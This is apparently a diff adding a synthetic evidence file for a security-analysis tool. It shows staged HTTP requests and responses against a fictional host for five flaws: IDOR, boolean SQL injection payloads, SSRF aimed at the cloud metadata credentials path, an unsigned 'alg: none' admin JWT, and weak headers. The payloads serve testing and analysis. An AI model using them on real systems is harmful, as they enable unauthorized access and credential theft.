@@ -1,0 +1,98 @@
+Synthetic evidence for the Analyzer. Paste the whole file, or one section at a
+time, into the Analyzer input. No real system is described here.
+
+================================================================================
+1. Broken object-level authorization (IDOR / BOLA)
+================================================================================
+Two accounts were provisioned for the test: analyst-a (user_id 4471) and
+analyst-b (user_id 4472). Authenticated as analyst-a:
+
+GET /api/v1/account/profile?user_id=4472 HTTP/1.1
+Host: vulnerable-demo.test
+Authorization: Bearer <analyst-a session token>
+Accept: application/json
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"user_id":4472,"name":"Analyst B","email":"analyst-b@example.test",
+ "phone":"+1-555-0142","role":"auditor","mfa_enabled":false}
+
+Repeating the request with user_id=1 returned the account of the platform
+administrator. No error, no audit entry observed in the account activity feed.
+
+================================================================================
+2. SQL injection in the report export endpoint
+================================================================================
+GET /api/v1/reports/export?format=csv HTTP/1.1
+Host: vulnerable-demo.test
+Authorization: Bearer <analyst-a session token>
+
+HTTP/1.1 200 OK
+{"rows":[...],"count":12}
+
+Boolean payload:
+GET /api/v1/reports/export?format=csv'+AND+'1'='2 HTTP/1.1
+HTTP/1.1 200 OK
+{"rows":[],"count":0}
+
+GET /api/v1/reports/export?format=csv'+AND+'1'='1 HTTP/1.1
+HTTP/1.1 200 OK
+{"rows":[...],"count":41827}
+
+The row count changes with the injected boolean condition, and 41827 exceeds the
+records the test account owns. A time-based payload produced a 12 second delay.
+
+================================================================================
+3. Server-side request forgery in the webhook tester
+================================================================================
+POST /api/v2/integrations/webhook/test HTTP/1.1
+Host: vulnerable-demo.test
+Content-Type: application/json
+Authorization: Bearer <analyst-a session token>
+
+{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"status":200,"body":"demo-app-instance-role"}
+
+The application fetched the address supplied by the client and returned the
+response body. No allowlist appears to be applied.
+
+================================================================================
+4. JWT algorithm confusion
+================================================================================
+The API issues HS256 tokens. A token was re-encoded with the alg header set to
+"none" and the signature removed, and the role claim changed to "admin":
+
+GET /api/v1/admin/users HTTP/1.1
+Host: vulnerable-demo.test
+Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiI0NDcxIiwicm9sZSI6ImFkbWluIn0.
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"users":[{"id":1,"email":"admin@example.test","role":"admin"}, ...]}
+
+The unsigned token was accepted and an administrative endpoint returned data.
+
+================================================================================
+5. Response headers on the application root (for header analysis)
+================================================================================
+GET / HTTP/1.1
+Host: vulnerable-demo.test
+
+HTTP/1.1 200 OK
+Server: nginx/1.24.0
+Content-Type: text/html; charset=utf-8
+Set-Cookie: session=abc123; Path=/; HttpOnly
+X-Powered-By: Express
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+
+No Strict-Transport-Security, Content-Security-Policy, or
+X-Content-Type-Options header is present. The session cookie has no Secure or
+SameSite attribute. The CORS policy reflects any origin while also allowing
+credentials.
